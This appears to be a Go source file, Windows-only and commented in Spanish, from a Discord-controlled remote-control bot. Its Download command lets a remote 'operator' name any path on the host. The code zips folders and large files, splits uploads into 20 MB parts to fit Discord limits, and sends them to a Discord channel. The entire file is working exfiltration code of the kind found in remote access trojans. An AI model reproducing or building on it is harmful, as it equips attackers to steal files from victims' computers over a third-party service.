//go:build windows

package commands

import (
	"archive/zip"
	"fmt"
	"io"
	"os"
	"path/filepath"

	"github.com/bwmarrin/discordgo"
)

const (
	// maxDirectUpload es el techo de un adjunto de Discord. Por encima de
	// esto el archivo se parte, porque la API rechaza el mensaje entero.
	maxDirectUpload = 25 * 1024 * 1024

	// partSize es el tamaño de cada parte al dividir. Deja margen bajo el
	// techo para las cabeceras del multipart.
	partSize = 20 * 1024 * 1024
)

// Download envía un archivo al operador. Si supera 25 MB o es un directorio,
// lo comprime en un zip temporal antes de subirlo. Si aun así pasa del techo
// de Discord, lo parte en bloques de 20 MB y los sube en orden.
func Download(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	path := StringOption(i, "path")
	if isBlank(path) {
		Finish(s, i, "❌ Falta la ruta.")
		return
	}

	info, err := os.Stat(path)
	if err != nil {
		Finish(s, i, "❌ "+err.Error())
		return
	}

	sendPath := path
	originalSize := info.Size()

	if info.IsDir() || info.Size() > maxDirectUpload {
		zipped, zipErr := zipPath(path)
		if zipErr != nil {
			Finish(s, i, "❌ No se pudo comprimir: "+zipErr.Error())
			return
		}
		defer func() {
			if rmErr := os.Remove(zipped); rmErr != nil {
				_ = rmErr
			}
		}()
		sendPath = zipped
	}

	stat, err := os.Stat(sendPath)
	if err != nil {
		Finish(s, i, "❌ "+err.Error())
		return
	}

	if stat.Size() > maxDirectUpload {
		sendParts(s, i, sendPath, originalSize)
		return
	}

	fileHandle, err := os.Open(sendPath)
	if err != nil {
		Finish(s, i, "❌ "+err.Error())
		return
	}
	defer func() {
		if cerr := fileHandle.Close(); cerr != nil {
			_ = cerr
		}
	}()

	content := fmt.Sprintf("📥 `%s` — %.2f MB", filepath.Base(sendPath), float64(originalSize)/(1024*1024))
	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
		Content: &content,
		Files: []*discordgo.File{{
			Name:   filepath.Base(sendPath),
			Reader: fileHandle,
		}},
	}); err != nil {
		Finish(s, i, "❌ No se pudo subir el archivo: "+err.Error())
	}
}

// sendParts divide el archivo y sube cada parte. La primera sale como edición
// de la interacción (el defer ya está en curso); el resto como mensajes del
// canal, que es lo único que admite adjuntos sin límite de 10 por respuesta.
func sendParts(s *discordgo.Session, i *discordgo.InteractionCreate, sendPath string, originalSize int64) {
	parts, err := splitFile(sendPath, partSize)
	if err != nil {
		Finish(s, i, "❌ No se pudo dividir: "+err.Error())
		return
	}
	defer func() {
		removePaths(parts)
		if len(parts) > 0 {
			_ = os.RemoveAll(filepath.Dir(parts[0]))
		}
	}()

	base := filepath.Base(sendPath)
	header := fmt.Sprintf("📦 `%s` — %.2f MB en %d partes de 20 MB",
		base, float64(originalSize)/(1024*1024), len(parts))

	for index, part := range parts {
		handle, openErr := os.Open(part)
		if openErr != nil {
			Finish(s, i, fmt.Sprintf("❌ Parte %d: %v", index+1, openErr))
			return
		}

		content := fmt.Sprintf("%s\nParte %d/%d — `%s`", header, index+1, len(parts), filepath.Base(part))

		var sendErr error
		if index == 0 {
			_, sendErr = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
				Content: &content,
				Files:   []*discordgo.File{{Name: filepath.Base(part), Reader: handle}},
			})
		} else {
			_, sendErr = s.ChannelMessageSendComplex(i.ChannelID, &discordgo.MessageSend{
				Content: content,
				Files:   []*discordgo.File{{Name: filepath.Base(part), Reader: handle}},
			})
		}

		if closeErr := handle.Close(); closeErr != nil {
			_ = closeErr
		}
		if sendErr != nil {
			Finish(s, i, fmt.Sprintf("❌ Parte %d/%d: %v", index+1, len(parts), sendErr))
			return
		}
	}
}

// splitFile parte src en bloques de partSize y devuelve las rutas temporales
// en orden, con nombre `<original>.partNN`, dentro de un directorio temporal
// propio. El llamador borra las partes y el directorio.
func splitFile(src string, size int64) ([]string, error) {
	if size <= 0 {
		return nil, fmt.Errorf("tamaño de parte inválido: %d", size)
	}

	info, err := os.Stat(src)
	if err != nil {
		return nil, err
	}
	fileSize := info.Size()

	source, err := os.Open(src)
	if err != nil {
		return nil, err
	}
	defer func() {
		if cerr := source.Close(); cerr != nil {
			_ = cerr
		}
	}()

	workDir, err := os.MkdirTemp("", "govoid_split_")
	if err != nil {
		return nil, err
	}

	base := filepath.Base(src)
	parts := make([]string, 0, 8)
	buffer := make([]byte, size)

	// El total va en el nombre de cada bloque: así el reensamblado en la otra
	// punta sabe cuántos faltan sin depender de un manifiesto aparte.
	totalParts := (fileSize + size - 1) / size

	for index := 1; ; index++ {
		read, readErr := io.ReadFull(source, buffer)
		if readErr == io.EOF {
			break
		}
		if readErr != nil && readErr != io.ErrUnexpectedEOF {
			removePaths(parts)
			_ = os.RemoveAll(workDir)
			return nil, readErr
		}

		partPath := filepath.Join(workDir,
			fmt.Sprintf("%s.part%03d-of-%03d", base, index, totalParts))
		out, createErr := os.Create(partPath)
		if createErr != nil {
			removePaths(parts)
			_ = os.RemoveAll(workDir)
			return nil, createErr
		}

		_, writeErr := out.Write(buffer[:read])
		closeErr := out.Close()
		if writeErr != nil {
			removePaths(parts)
			_ = os.RemoveAll(workDir)
			return nil, writeErr
		}
		if closeErr != nil {
			removePaths(parts)
			_ = os.RemoveAll(workDir)
			return nil, closeErr
		}
		parts = append(parts, partPath)

		if readErr == io.ErrUnexpectedEOF {
			break
		}
	}

	if len(parts) == 0 {
		_ = os.RemoveAll(workDir)
		return nil, fmt.Errorf("archivo vacío: %s", src)
	}
	return parts, nil
}

func removePaths(paths []string) {
	for _, path := range paths {
		if rmErr := os.Remove(path); rmErr != nil {
			_ = rmErr
		}
	}
}

func zipPath(src string) (string, error) {
	tmpFile, err := os.CreateTemp("", "govoid_*.zip")
	if err != nil {
		return "", err
	}
	tmpName := tmpFile.Name()

	writer := zip.NewWriter(tmpFile)
	walkErr := filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}

		rel, err := filepath.Rel(filepath.Dir(src), path)
		if err != nil {
			return err
		}

		entry, err := writer.Create(filepath.ToSlash(rel))
		if err != nil {
			return err
		}

		source, err := os.Open(path)
		if err != nil {
			return err
		}
		_, copyErr := io.Copy(entry, source)
		closeErr := source.Close()
		if copyErr != nil {
			return copyErr
		}
		return closeErr
	})

	if walkErr != nil {
		writer.Close()
		tmpFile.Close()
		os.Remove(tmpName)
		return "", walkErr
	}
	if err := writer.Close(); err != nil {
		tmpFile.Close()
		os.Remove(tmpName)
		return "", err
	}
	if err := tmpFile.Close(); err != nil {
		os.Remove(tmpName)
		return "", err
	}
	return tmpName, nil
}
